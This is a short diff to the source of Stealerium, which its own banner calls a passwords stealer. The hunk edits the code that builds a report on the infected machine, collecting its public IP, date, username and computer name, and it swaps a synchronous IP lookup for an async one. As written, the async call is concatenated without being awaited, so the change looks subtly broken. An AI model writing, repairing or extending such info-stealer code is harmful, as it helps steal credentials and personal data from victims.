@@ -63,7 +63,7 @@ namespace Stealerium.Helpers
                                   $"\nStealerium v{Config.Version} - Passwords stealer coded by Stealerium with Love <3" +
                                   "\n" +
                                   "\n== System Info ==" +
-                                  "\nIP: " + SystemInfo.GetPublicIp() +
+                                  "\nIP: " + SystemInfo.GetPublicIpAsync() +
                                   "\nDate: " + SystemInfo.Datenow +
                                   "\nUsername: " + SystemInfo.Username +
                                   "\nCompName: " + SystemInfo.Compname +
